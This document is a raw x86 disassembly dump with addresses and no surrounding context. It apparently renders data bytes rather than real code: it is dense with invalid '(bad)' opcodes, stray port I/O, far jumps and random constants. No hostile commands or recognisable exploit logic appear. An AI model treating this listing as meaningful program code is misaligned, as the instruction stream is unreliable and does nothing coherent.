  4221ef:	fdiv   DWORD PTR [esi-0x73]
  4221f2:	or     al,0x80
  4221f4:	jb     0x4221c7
  4221f6:	xchg   ebx,eax
  4221f7:	imul   edi,ecx,0xffffffd1
  4221fa:	fmul   QWORD PTR [ecx-0x284826b3]
  422200:	loope  0x4221be
  422202:	pop    edx
  422203:	lock es push eax
  422206:	jnp    0x42223b
  422208:	or     bh,0x99
  42220b:	cld    
  42220c:	or     ebp,eax
  42220e:	push   0xc92dcc91
  422213:	jno    0x42219c
  422215:	pop    ss
  422216:	into   
  422217:	adc    BYTE PTR [eax+0x6d],0x40
  42221b:	add    al,0xee
  42221d:	clc    
  42221e:	daa    
  42221f:	mov    bh,0xc0
  422221:	push   ebx
  422222:	xchg   esi,eax
  422223:	xchg   esi,eax
  422224:	lods   eax,DWORD PTR ds:[esi]
  422225:	(bad)  
  422226:	dec    esp
  422227:	fidiv  DWORD PTR [ecx]
  422229:	fwait
  42222a:	pop    ds
  42222b:	fwait
  42222c:	aaa    
  42222d:	add    al,0x91
  42222f:	mov    ds:0xee4d604c,al
  422234:	push   ecx
  422235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422236:	outs   dx,BYTE PTR ds:[esi]
  422237:	pop    esi
  422238:	leave  
  422239:	mov    edx,0x93efb80
  42223e:	mov    esp,0x5a6ff3da
  422243:	or     DWORD PTR [ebx+0x3030a5a5],ebp
  422249:	mov    al,ds:0x2138846b
  42224e:	cmp    ax,0xac32
  422252:	(bad)  
  422253:	dec    esi
  422254:	xchg   ecx,eax
  422255:	or     BYTE PTR ds:0xc1288b04,al
  42225b:	xchg   esi,eax
  42225c:	mov    ds:0x5b3d347c,eax
  422261:	adc    al,BYTE PTR [ecx-0x12]
  422264:	sbb    BYTE PTR [edi+0x14f1264b],dh
  42226a:	leave  
  42226b:	pop    esp
  42226c:	enter  0x6e8,0x8a
  422270:	cli    
  422271:	sbb    BYTE PTR [ebx],ch
  422273:	inc    edx
  422274:	push   ds
  422275:	dec    ebx
  422276:	adc    dh,BYTE PTR [eax+0x1b]
  422279:	xor    al,0xe5
  42227b:	inc    edi
  42227c:	repnz les eax,FWORD PTR [ecx]
  42227f:	(bad)  
  422280:	not    BYTE PTR [esi+0x6dfe1915]
  422286:	pusha  
  422287:	aaa    
  422288:	int    0x59
  42228a:	or     BYTE PTR [eax],dl
  42228c:	hlt    
  42228d:	sbb    BYTE PTR [edx],bl
  42228f:	xlat   BYTE PTR ds:[ebx]
  422290:	arpl   cx,di
  422292:	(bad)  
  422294:	sbb    ch,bl
  422296:	sahf   
  422297:	fucom  st(5)
  422299:	fs jmp 0x422251
  42229c:	inc    edi
  42229d:	xchg   esp,eax
  42229e:	jmp    0x42230c
  4222a0:	dec    BYTE PTR [ebp+0x18]
  4222a3:	mov    ch,0x6e
  4222a5:	std    
  4222a6:	cmc    
  4222a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222a8:	mov    al,0x10
  4222aa:	in     al,0x8d
  4222ac:	xor    edi,ebp
  4222ae:	push   edi
  4222af:	mov    bl,0xf0
  4222b1:	jg     0x4222f3
  4222b3:	gs call 0xdda4:0xcaf88c5d
  4222bb:	jg     0x4222ed
  4222bd:	pop    ecx
  4222be:	mov    cl,0xda
  4222c0:	mov    ecx,0x66bc1ed0
  4222c5:	mov    bh,0xc4
  4222c7:	dec    esp
  4222c8:	call   0x8596fdd1
  4222cd:	xchg   ebp,eax
  4222ce:	or     al,BYTE PTR [esi-0x78bf9784]
  4222d4:	cld    
  4222d5:	aaa    
  4222d6:	cmp    ebp,edi
  4222d8:	add    BYTE PTR [ecx],al
  4222da:	mov    ds,WORD PTR [eax]
  4222dc:	cmp    BYTE PTR [eax],0x23
  4222df:	mov    DWORD PTR [esi-0x2f],edi
  4222e2:	fisttp WORD PTR [eax]
  4222e4:	jp     0x4222de
  4222e6:	js     0x422329
  4222e8:	mov    ds:0x2e423180,eax
  4222ed:	cmp    DWORD PTR [eax],eax
	...
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	or     bh,bh
  422364:	das    
  422365:	popa   
  422366:	outs   dx,DWORD PTR ds:[si]
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	loope  0x422335
  422370:	or     eax,0xcc8eff29
  422375:	(bad)  
  422377:	daa    
  422378:	ja     0x4223dd
  42237a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42237b:	xor    eax,0x7cd2eedf
  422380:	cmp    dh,BYTE PTR [edi]
  422382:	sub    eax,0x2f723e
  422387:	icebp  
  422388:	or     eax,DWORD PTR [ecx-0x48]
  42238b:	repz xchg esp,eax
  42238d:	jp     0x42237b
  42238f:	shl    BYTE PTR [edx+0xc],cl
  422392:	fadd   QWORD PTR [esi+edi*4-0x470e813a]
  422399:	ret    
  42239a:	leave  
  42239b:	mov    ds:0xd9997d7a,eax
  4223a0:	and    ah,al
  4223a2:	sub    eax,0x41eb483
  4223a7:	and    BYTE PTR [esi],dh
  4223a9:	maxps  xmm1,XMMWORD PTR [edi+0x71b3af6d]
  4223b0:	les    esp,FWORD PTR [ecx]
  4223b2:	cs adc eax,0x7916821a
  4223b8:	rcr    ecx,cl
  4223ba:	push   DWORD PTR [edi]
  4223bc:	mov    esp,0x341fc6d6
  4223c1:	lahf   
  4223c2:	xchg   edx,eax
  4223c3:	das    
  4223c4:	jge    0x42242c
  4223c6:	push   esi
  4223c7:	push   0x25
  4223c9:	idiv   BYTE PTR [ecx]
  4223cb:	pop    eax
  4223cc:	dec    esi
  4223cd:	out    0x16,al
  4223cf:	inc    ebx
  4223d0:	or     BYTE PTR [ebx+eiz*8-0x1a],bl
  4223d4:	push   ss
  4223d5:	cwde   
  4223d6:	aam    0x4d
  4223d8:	add    al,BYTE PTR [ebp-0x4c]
  4223db:	inc    edx
  4223dc:	inc    esp
  4223dd:	sbb    BYTE PTR ds:0xc97f9a50,al
  4223e3:	scas   eax,DWORD PTR es:[edi]
  4223e4:	mov    ebp,0x3247136e
  4223e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ea:	mov    edx,0x1154dc50
  4223ef:	pop    ss
  4223f0:	jmp    0x957:0xcf8de8b3
  4223f7:	mov    dl,0x16
  4223f9:	(bad)  
  4223fa:	fwait
  4223fb:	shl    edi,cl
  4223fd:	stos   DWORD PTR es:[edi],eax
  4223fe:	in     eax,dx
  4223ff:	dec    ebp
  422400:	cwde   
  422401:	and    bh,bl
  422403:	mov    DWORD PTR [esp+edi*8+0x48],eax
  422407:	cmp    BYTE PTR ds:0x3d240143,bh
  42240d:	(bad)  
  42240e:	hlt    
  42240f:	addr16 in al,0xd3
  422412:	pushf  
  422413:	(bad)  
  422415:	jge    0x422439
  422417:	cmp    eax,0x14f83c7e
  42241c:	add    DWORD PTR [ecx+0x43],ebp
  42241f:	add    eax,DWORD PTR [edx+0xd3bd22b]
  422425:	rcr    BYTE PTR [edi+0x13],1
  422428:	jae    0x4223cd
  42242a:	dec    eax
  42242b:	lahf   
  42242c:	repz cli 
  42242e:	std    
  42242f:	adc    al,0xa7
  422431:	mov    esi,0xed3ffcd7
  422436:	push   cs
  422437:	sahf   
  422438:	jg     0x4223bc
  42243a:	jl     0x42240d
  42243c:	rcr    DWORD PTR [ebp-0x3dd84071],0xb1
  422443:	jmp    DWORD PTR [eax-0xe]
  422446:	ffree  st(7)
  422448:	xchg   edx,eax
  422449:	out    0x69,al
  42244b:	xlat   BYTE PTR ds:[ebx]
  42244c:	(bad)  
  42244d:	xchg   edx,eax
  42244e:	sub    al,0xc3
  422451:	sbb    DWORD PTR [esi+0x1f32a22c],ebx
  422457:	pusha  
  422458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422459:	xchg   ebx,eax
  42245a:	jne    0x42240f
  42245c:	xor    ch,BYTE PTR [ebp-0x21]
  42245f:	pop    ebx
  422460:	setg   BYTE PTR [esi]
  422463:	jmp    0xd24f:0xda03a813
  42246a:	ret    
  42246b:	lea    edi,[edx]
  42246d:	adc    al,BYTE PTR [eax]
	...
  4224d3:	add    BYTE PTR [eax],al
  4224d5:	add    BYTE PTR [edx-0x7e],dl
  4224d8:	cs imul edi,esi,0xbbbb57ed
  4224df:	xor    ebp,esp
  4224e1:	cdq    
  4224e2:	sub    BYTE PTR [ebx-0x5e],al
  4224e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224e6:	addr16 jo 0x4224ea
  4224e9:	add    BYTE PTR [eax],al
  4224eb:	add    DWORD PTR [eax],eax
  4224ed:	add    BYTE PTR [esi-0x42493629],ch
  4224f3:	jecxz  0x422553
  4224f5:	and    al,0xe4
  4224f7:	aam    0xca
  4224f9:	xchg   ecx,edi
  4224fb:	popa   
  4224fc:	retf   0x4107
  4224ff:	sub    al,0x6b
  422501:	jmp    0x64cb:0xdcdd539a
  422508:	mov    ds:0x84412af,al
  42250d:	dec    edi
  42250e:	or     DWORD PTR [esp+edx*4],edi
  422511:	out    0xef,al
  422513:	mov    bl,0x90
  422515:	out    dx,al
  422516:	into   
  422517:	in     al,0xac
  422519:	mov    esp,DWORD PTR ds:[edi+0x4a]
  42251d:	and    DWORD PTR [eax],ebx
  42251f:	cmp    ebp,eax
  422521:	(bad)  
  422522:	idiv   edx
  422524:	rcl    BYTE PTR [ebp+0x4c],1
  422527:	mov    ah,0x6c
  422529:	sbb    ah,al
  42252b:	aam    0xa3
  42252d:	ror    BYTE PTR ds:0x29f5f8cc,1
  422533:	in     eax,0xed
  422535:	lea    eax,[ebp+0x4c]
  422538:	push   eax
  422539:	adc    BYTE PTR [ebp+0x4252d71e],bh
  42253f:	cmp    DWORD PTR [edi+0x16],ebp
  422542:	mov    ds:0x7063ab07,al
  422547:	mov    bh,0x28
  422549:	push   ebp
  42254a:	rcl    eax,1
  42254c:	jle    0x422539
  42254e:	nop
  42254f:	lock es (bad) 
  422552:	out    0x3a,al
  422554:	add    eax,0xff26cd08
  422559:	fild   QWORD PTR [ebp+0x2d]
  42255c:	scas   eax,DWORD PTR es:[edi]
  42255d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42255e:	(bad)  
  42255f:	sahf   
  422560:	add    al,0xe0
  422562:	ror    DWORD PTR [eax-0x158da881],1
  422568:	fimul  DWORD PTR [esi-0x4cb295bb]
  42256e:	call   0xd3d4f337
  422573:	xchg   DWORD PTR [ecx],ebp
  422575:	mov    ch,0xc1
  422577:	test   DWORD PTR [ebp+0x4e],ecx
  42257a:	jp     0x42259a
  42257c:	mov    ch,0xbf
  42257e:	sbb    cl,BYTE PTR [eax+0x52aa6b52]
  422584:	mov    ebx,0xf7dceef4
  422589:	mov    dh,0x8b
  42258b:	jl     0x42253a
  42258d:	lock mov ah,0x95
  422590:	test   BYTE PTR [ebx],0x1e
  422593:	add    al,BYTE PTR [ebx-0x62]
  422596:	mov    esp,0x97e044bf
  42259b:	in     eax,0x91
  42259d:	call   FWORD PTR [edi+eiz*8+0x4e603f36]
  4225a4:	retf   
  4225a5:	jne    0x42252f
  4225a7:	data16 jb 0x422620
  4225aa:	lock push ds
  4225ac:	out    dx,al
  4225ad:	cmp    BYTE PTR [edi-0x19a1218c],0x58
  4225b4:	push   edi
  4225b5:	rol    DWORD PTR [edx+eax*1],cl
  4225b8:	mov    edi,0x364613d2
  4225bd:	xchg   DWORD PTR [esi],edx
  4225bf:	xor    DWORD PTR [ebp+0x37713f93],edi
  4225c5:	or     ecx,DWORD PTR [edi-0x6d]
  4225c8:	pushf  
  4225c9:	inc    esi
  4225ca:	aaa    
  4225cb:	jo     0x4225b9
  4225cd:	jns    0x42263a
  4225cf:	jmp    0xb3d3:0x8a37d126
  4225d6:	mov    edi,0x233c6bdb
  4225db:	es (bad) 
  4225dd:	in     eax,dx
  4225de:	push   ss
  4225df:	xchg   ebp,eax
  4225e0:	xor    edx,edi
  4225e2:	and    ecx,DWORD PTR [eax-0x6e69302d]
  4225e8:	adc    DWORD PTR [esi],ecx
  4225ea:	mov    edi,0xd87b13
	...
  422653:	add    BYTE PTR [eax],al
  422655:	add    BYTE PTR [edx-0x40887052],bl
  42265b:	ja     0x422657
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x1eb75d08]
  422664:	(bad)  
  422665:	(bad)  
  422666:	addr16 jno 0x42266a
  422669:	add    BYTE PTR [eax],al
  42266b:	add    DWORD PTR [eax],eax
  42266d:	add    BYTE PTR [edi],dh
  42266f:	push   edx
  422670:	mov    ds:0x11c81fe3,eax
  422675:	adc    DWORD PTR [edi-0x919dfbb],0x1b28c4f8
  42267f:	pop    es
  422680:	mov    al,0x0
  422682:	adc    esp,0xffffffbf
  422685:	inc    ecx
  422686:	push   edx
  422687:	repz xor edx,DWORD PTR [esi]
  42268a:	xor    dh,bl
  42268c:	retf   0x5f9c
  42268f:	leave  
  422690:	out    dx,al
  422691:	dec    ebx
  422692:	loopne 0x4226ac
  422694:	dec    edx
  422695:	xor    DWORD PTR [ebx],edx
  422697:	sbb    edx,DWORD PTR [edi]
  422699:	push   DWORD PTR [edx-0x4005f9a4]
  42269f:	pop    ds
  4226a0:	cmp    BYTE PTR [edi+0x1e2ff1d],dl
  4226a6:	leave  
  4226a7:	add    al,0x81
  4226a9:	mov    ds:0x92624f26,eax
  4226ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226af:	inc    ebp
  4226b0:	aam    0xba
  4226b2:	add    edi,DWORD PTR [ebx]
  4226b4:	sqrtps xmm5,XMMWORD PTR [esi]
  4226b7:	sub    al,BYTE PTR [esp+edi*8]
  4226ba:	jmp    0x4226d7
  4226bc:	dec    ebp
  4226bd:	dec    ebp
  4226bf:	jo     0x42272f
  4226c1:	es icebp 
  4226c3:	push   ss
  4226c4:	loop   0x4226ba
  4226c6:	or     eax,0x8e3a8368
  4226cb:	or     bh,BYTE PTR [edx+0x53]
  4226ce:	aaa    
  4226cf:	es aam 0x13
  4226d2:	imul   BYTE PTR [esi+0x4d]
  4226d5:	out    dx,eax
  4226d6:	dec    esi
  4226d7:	mov    dl,0xe3
  4226d9:	in     al,0x6b
  4226db:	or     DWORD PTR ds:0xea8019dd,ebx
  4226e1:	into   
  4226e2:	sar    BYTE PTR [ecx-0x18],cl
  4226e5:	or     BYTE PTR [eax+0x3a],dl
  4226e8:	fnstcw WORD PTR [edi-0x7d30e2e1]
  4226ee:	std    
  4226ef:	je     0x4226a6
  4226f1:	inc    edi
  4226f2:	sub    ah,BYTE PTR [esi+0x1e62ccf]
  4226f8:	js     0x42270b
  4226fa:	cmp    eax,0x4a4498be
  4226ff:	test   eax,0xe3c8fbc0
  422704:	dec    esi
  422705:	mov    edi,0xd9c1c114
  42270a:	repz aad 0xf
  42270d:	call   0xb0297d56
  422712:	sub    bh,BYTE PTR [ecx+0x6c]
  422715:	addr16 jl 0x42275a
  422718:	xor    DWORD PTR [edx-0x5d],0x32d39083
  42271f:	xchg   ecx,eax
  422720:	push   ebx
  422721:	pop    ebp
  422722:	fst    QWORD PTR [ebp+0x14]
  422725:	xchg   edi,eax
  422726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422727:	(bad)  
  422728:	sub    eax,0x30d60e8c
  42272d:	push   ebp
  42272e:	fs popa 
  422730:	inc    edx
  422731:	shl    DWORD PTR [ebx],0x8d
  422734:	inc    edi
  422735:	(bad)  
  422736:	ds data16 lahf 
  422739:	sbb    ah,bh
  42273b:	pop    esi
  42273c:	(bad)
  42273f:	cmp    cl,BYTE PTR [ebp-0xf9de649]
  422745:	call   0x6edb:0x684aaf42
  42274c:	dec    edi
  42274d:	push   edi
  42274e:	push   edx
  42274f:	out    0x23,eax
  422751:	xchg   ebp,eax
  422752:	cmc    
  422753:	lds    eax,FWORD PTR [edi+0x74763a79]
  422759:	or     esp,DWORD PTR [edi]
  42275b:	shr    DWORD PTR [ebp-0x54],1
  42275e:	or     al,0x26
  422760:	push   ss
  422761:	and    edi,DWORD PTR [ebp-0x39]
  422764:	fs adc cl,bh
  422767:	shl    ebx,cl
  422769:	push   ecx
  42276a:	aas    
  42276b:	sub    DWORD PTR [ecx],ecx
  42276d:	jns    0x42276f
	...
  4227d3:	add    BYTE PTR [eax],al
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0xe27f01c8
  4227e3:	sbb    al,0x6c
  4227e5:	jo     0x42284e
  4227e7:	jb     0x4227ea
  4227e9:	add    BYTE PTR [eax],al
  4227eb:	add    DWORD PTR [eax],eax
  4227ed:	add    BYTE PTR [eax-0x49],cl
  4227f0:	leave  
  4227f1:	popfw  
  4227f3:	add    eax,0xb313c267
  4227f8:	jmp    0x71b2ade5
  4227fd:	and    DWORD PTR [ebp+0x75],eax
  422800:	imul   esi,DWORD PTR [ebp+0x11],0xcf0841e8
  422807:	fidiv  WORD PTR [edx-0x2c]
  42280a:	clc    
  42280b:	adc    edi,eax
  42280d:	dec    ebp
  42280e:	cmp    esp,DWORD PTR [esi]
  422810:	xor    esi,DWORD PTR [eax]
  422812:	shl    ecx,1
  422814:	in     eax,dx
  422815:	jl     0x42281e
  422817:	push   ebp
  422818:	(bad)  
  422819:	sbb    ch,BYTE PTR [esi]
  42281b:	ret    0xfebf
  42281e:	rcl    ah,1
  422820:	scas   al,BYTE PTR es:[edi]
  422821:	je     0x42288b
  422823:	adc    bl,BYTE PTR [eax+0x6e550a2f]
  422829:	pop    ds
  42282a:	ret    
  42282b:	jg     0x422859
  42282d:	fcomp  QWORD PTR [eax]
  42282f:	jle    0x422897
  422831:	sbb    eax,0x2cef4fd3
  422836:	stos   DWORD PTR es:[edi],eax
  422837:	jmp    0x4227e2
  422839:	aam    0x6f
  42283b:	scas   eax,DWORD PTR es:[edi]
  42283c:	push   edi
  42283d:	pop    esp
  42283e:	mov    bl,0xa5
  422840:	pop    eax
  422841:	pop    es
  422842:	ja     0x422894
  422844:	or     BYTE PTR [edx+0x56030af7],0xc0
  42284b:	(bad)  
  42284c:	hlt    
  42284d:	cmp    DWORD PTR [ecx+0x2ee1154d],edx
  422853:	ret    0x3b10
  422856:	inc    esp
  422857:	jae    0x42283f
  422859:	lods   al,BYTE PTR ds:[esi]
  42285a:	add    bh,BYTE PTR [eax]
  42285c:	mov    bl,0xa5
  42285e:	mov    edx,0x54766c9c
  422863:	cli    
  422864:	mov    ds:0x63c17198,eax
  422869:	les    edx,FWORD PTR [ebp-0x36ed93f2]
  42286f:	fadd   DWORD PTR [esi-0x39ede96b]
  422875:	pop    ss
  422876:	adc    DWORD PTR [esi+0x19ff6055],edi
  42287c:	jne    0x42287b
  42287e:	and    al,0xf8
  422880:	mov    cl,0x5b
  422882:	sub    edx,DWORD PTR [esi+edx*4+0x73]
  422886:	cmc    
  422887:	das    
  422888:	inc    edi
  422889:	add    DWORD PTR [ebx-0x257375fc],edi
  42288f:	hlt    
  422890:	enter  0x400c,0xdd
  422894:	pop    ecx
  422895:	(bad)  
  422896:	mov    edi,DWORD PTR [eax]
  422898:	js     0x4228bf
  42289a:	mov    al,0x6b
  42289c:	into   
  42289d:	pop    es
  42289e:	mov    BYTE PTR [ebx+0x799582e2],bl
  4228a4:	dec    ebp
  4228a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228a6:	dec    eax
  4228a7:	(bad)  
  4228a8:	cld    
  4228a9:	adc    eax,0x94acae2b
  4228ae:	xor    BYTE PTR [ecx*2-0x7bb291fd],bh
  4228b5:	adc    bl,ch
  4228b7:	loope  0x42290c
  4228b9:	and    bh,BYTE PTR [esi]
  4228bb:	call   FWORD PTR [edi-0x80]
  4228be:	jnp    0x4228b2
  4228c0:	xchg   ecx,eax
  4228c1:	xchg   esi,eax
  4228c2:	push   ebp
  4228c3:	aaa    
  4228c4:	inc    esi
  4228c5:	sbb    BYTE PTR [ebp+0x66f9e5a0],dh
  4228cb:	xchg   ebx,eax
  4228cc:	jmp    0x4228b9
  4228ce:	mov    bl,BYTE PTR [edx-0x2c0193ee]
  4228d4:	les    ebp,FWORD PTR [edi+0x48ce1293]
  4228da:	xor    al,0x1f
  4228dc:	iret   
  4228dd:	dec    esi
  4228de:	cdq    
  4228df:	fwait
  4228e0:	cmp    edx,DWORD PTR [edx+0x7c]
  4228e3:	or     ebp,DWORD PTR [edx-0x6f3449e9]
  4228e9:	inc    DWORD PTR [edx]
  4228eb:	push   0xffffff8f
  4228ed:	push   edi
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x422924
  422963:	mov    DWORD PTR [esi+0x1736777],eax
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    BYTE PTR [edx],al
  42296f:	cmp    ecx,edx
  422971:	push   cs
  422972:	imul   ebp,DWORD PTR [edx-0x1],0x74049e5a
  422979:	loop   0x422965
  42297b:	jp     0x42292f
  42297d:	inc    ecx
  42297e:	and    esi,esp
  422980:	inc    ecx
  422981:	sbb    dh,bl
  422983:	or     ebx,DWORD PTR [edi+0x48]
  422986:	xchg   edx,eax
  422987:	cmc    
  422988:	and    bh,ch
  42298a:	in     al,dx
  42298b:	inc    ecx
  42298c:	in     eax,dx
  42298d:	sbb    eax,0xe206d947
  422992:	lock adc eax,0xafa3e515
  422998:	dec    edx
  422999:	pop    ds
  42299a:	imul   ecx,DWORD PTR [ecx],0x733f528f
  4229a0:	mov    ds:0x95bbae0b,eax
  4229a5:	loope  0x42295a
  4229a7:	sbb    ebx,ebx
  4229a9:	(bad)  
  4229ab:	jnp    0x4229f8
  4229ad:	cld    
  4229ae:	and    DWORD PTR [esi],esi
  4229b0:	add    dh,BYTE PTR [ecx+0x5a8698b9]
  4229b6:	lods   eax,DWORD PTR ds:[esi]
  4229b7:	dec    esi
  4229b8:	and    al,cl
  4229ba:	shl    BYTE PTR cs:[eax-0x9e71a9c],0x95
  4229c2:	imul   dx,WORD PTR [eax-0x76],0xe72f
  4229c8:	pop    edx
  4229c9:	jne    0x4229c3
  4229cb:	test   ebx,eax
  4229cd:	inc    ebx
  4229ce:	adc    bl,dl
  4229d0:	js     0x422990
  4229d2:	cdq    
  4229d3:	inc    edx
  4229d4:	ins    DWORD PTR es:[edi],dx
  4229d5:	adc    DWORD PTR [edx],0x16
  4229d8:	push   0xe850439d
  4229dd:	stos   BYTE PTR es:[edi],al
  4229de:	cwde   
  4229df:	xor    BYTE PTR [ebp-0x1c],0x9f
  4229e3:	mov    esi,0x26a65b6e
  4229e8:	inc    esp
  4229e9:	mov    bl,0x64
  4229eb:	adc    dl,BYTE PTR ds:0x97756136
  4229f1:	inc    edx
  4229f2:	inc    eax
  4229f3:	iret   
  4229f4:	in     al,dx
  4229f5:	out    0xa6,eax
  4229f7:	retf   
  4229f8:	fs in  al,0x86
  4229fb:	stc    
  4229fc:	push   es
  4229fd:	pusha  
  4229fe:	ja     0x422a50
  422a00:	adc    DWORD PTR [edx+0x34],ebp
  422a03:	xlat   BYTE PTR ds:[ebx]
  422a04:	fistp  DWORD PTR [edi]
  422a06:	pop    ss
  422a07:	jo     0x4229fa
  422a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a0a:	inc    esi
  422a0b:	retf   0xe59a
  422a0e:	add    DWORD PTR [ebp-0x247d660b],0x7fa7db0
  422a18:	cld    
  422a19:	push   ss
  422a1a:	lea    esi,[edi+ebx*2]
  422a1d:	mov    dl,0x1
  422a1f:	adc    esi,DWORD PTR [esi]
  422a21:	sahf   
  422a22:	(bad)  
  422a23:	sbb    al,0xd5
  422a25:	xlat   BYTE PTR ds:[ebx]
  422a26:	add    dh,BYTE PTR [ecx]
  422a28:	test   eax,0x9e29a136
  422a2d:	push   ebx
  422a2e:	nop
  422a2f:	jecxz  0x422a59
  422a31:	bound  esp,QWORD PTR [edi-0x3119e7c4]
  422a37:	lea    eax,[edi+eiz*1+0x465667e]
  422a3e:	mov    ecx,0x47e394bf
  422a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a44:	in     eax,dx
  422a45:	arpl   WORD PTR [ebp+0x71],dx
  422a48:	js     0x422a61
  422a4a:	das    
  422a4b:	(bad)  
  422a4c:	sti    
  422a4d:	int    0xae
  422a4f:	jns    0x422aa1
  422a51:	jb     0x4229d8
  422a53:	mov    ebp,0xee141834
  422a58:	fldcw  WORD PTR [edx-0x6]
  422a5b:	mov    edi,0xe79ba6fb
  422a60:	call   DWORD PTR fs:[ecx-0xd]
  422a64:	leave  
  422a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a66:	xor    bh,dh
  422a68:	dec    esp
  422a69:	pop    edi
  422a6a:	ret    0x8bb8
  422a6d:	push   ds
	...
  422ad6:	xchg   esi,eax
  422ad7:	push   0x18
  422ad9:	mov    ah,bh
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	cwde   
  422ae3:	cs loopne 0x422a77
  422ae6:	addr16 je 0x422aea
  422ae9:	add    BYTE PTR [eax],al
  422aeb:	add    DWORD PTR [eax],eax
  422aed:	add    BYTE PTR [eax-0x9daf9f0],al
  422af3:	bound  esp,QWORD PTR [edx-0x65a81c81]
  422af9:	jg     0x422a96
  422afb:	repnz test al,0x31
  422afe:	mov    edi,0xcd02d9bf
  422b03:	adc    esp,eax
  422b05:	das    
  422b06:	repnz cld 
  422b08:	addr16 pop edi
  422b0a:	or     al,0xbb
  422b0c:	dec    ebx
  422b0d:	(bad)  
  422b0f:	mov    bl,0xbb
  422b11:	mov    WORD PTR [ecx-0x483ec4eb],cs
  422b17:	cwde   
  422b18:	mov    ds:0xf95ce5dc,eax
  422b1d:	sub    dl,BYTE PTR [ecx-0x348bdbb0]
  422b23:	imul   ebx,DWORD PTR [ecx-0x4158eb8b],0xffffffcb
  422b2a:	imul   DWORD PTR [ecx+0x147018db]
  422b30:	sub    dl,BYTE PTR [edx-0x70fd9d3e]
  422b36:	and    BYTE PTR [edx],al
  422b38:	mov    cl,0x4c
  422b3a:	xchg   ebp,eax
  422b3b:	mov    bl,0x57
  422b3d:	push   0xffffffbe
  422b3f:	out    dx,eax
  422b40:	scas   eax,DWORD PTR es:[edi]
  422b41:	call   0x8833:0x3394e5cf
  422b48:	pop    esp
  422b49:	enter  0x5703,0x86
  422b4d:	leave  
  422b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b4f:	out    dx,eax
  422b50:	mov    eax,ds:0x49c27513
  422b55:	arpl   si,ax
  422b57:	and    eax,0x9f407cc3
  422b5c:	(bad)  
  422b5d:	sahf   
  422b5e:	mov    al,ds:0x90627edb
  422b63:	jb     0x422b63
  422b65:	sbb    esi,DWORD PTR [eax-0x41dd6f74]
  422b6b:	mov    edi,0x23c42106
  422b70:	or     BYTE PTR [edi],bh
  422b72:	push   edi
  422b73:	mov    WORD PTR [ebx-0x4b],es
  422b76:	xchg   edx,eax
  422b77:	xor    eax,0x81007023
  422b7c:	inc    ecx
  422b7d:	add    ecx,DWORD PTR [ebx]
  422b7f:	idiv   BYTE PTR [ebp-0x40]
  422b82:	xor    DWORD PTR [esi-0x1062d24e],esp
  422b88:	fs popf 
  422b8a:	jb     0x422be9
  422b8c:	xchg   ecx,eax
  422b8d:	mov    WORD PTR [ebp-0x6656c039],?
  422b93:	std    
  422b94:	stos   DWORD PTR es:[edi],eax
  422b95:	xchg   edi,eax
  422b96:	mov    edi,0xf1823ebe
  422b9b:	inc    ebp
  422b9c:	cwde   
  422b9d:	cli    
  422b9e:	psrld  mm5,QWORD PTR [ecx]
  422ba1:	mov    eax,ds:0x12df3dc2
  422ba6:	mov    al,0xfe
  422ba8:	cdq    
  422ba9:	push   0x65
  422bab:	into   
  422bac:	mov    edx,0x4b70b87f
  422bb1:	je     0x422b7d
  422bb3:	xor    cl,BYTE PTR [ebp+0x36]
  422bb6:	popa   
  422bb7:	pop    ebx
  422bb8:	loop   0x422b8b
  422bba:	cmp    eax,0xaa4a191b
  422bbf:	sbb    eax,0xecee64d3
  422bc4:	lds    edx,FWORD PTR [edx]
  422bc6:	dec    esi
  422bc7:	(bad)  
  422bc9:	(bad)  
  422bca:	cmp    al,0x18
  422bcc:	dec    ebx
  422bcd:	dec    edi
  422bce:	retf   
  422bcf:	sub    BYTE PTR [esi],cl
  422bd1:	adc    al,0xb0
  422bd3:	ja     0x422bd3
  422bd5:	xor    ebx,DWORD PTR [eax+0x5a]
  422bd8:	jp     0x422b5e
  422bda:	nop
  422bdb:	ret    0x7e58
  422bde:	call   0x9dfe2256
  422be3:	mov    BYTE PTR [edx],dl
  422be5:	or     eax,0x3cc59e08
  422bea:	cli    
  422beb:	push   0xffffffe2
  422bed:	xor    al,BYTE PTR [eax]
	...
  422c53:	add    BYTE PTR [eax],al
  422c55:	add    BYTE PTR [edi+esi*1+0x4a],al
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx-0x66f3b264]
  422c64:	mov    ebp,0x1756760
  422c69:	add    BYTE PTR [eax],al
  422c6b:	add    DWORD PTR [eax],eax
  422c6d:	add    dh,bl
  422c6f:	pushf  
  422c70:	inc    ecx
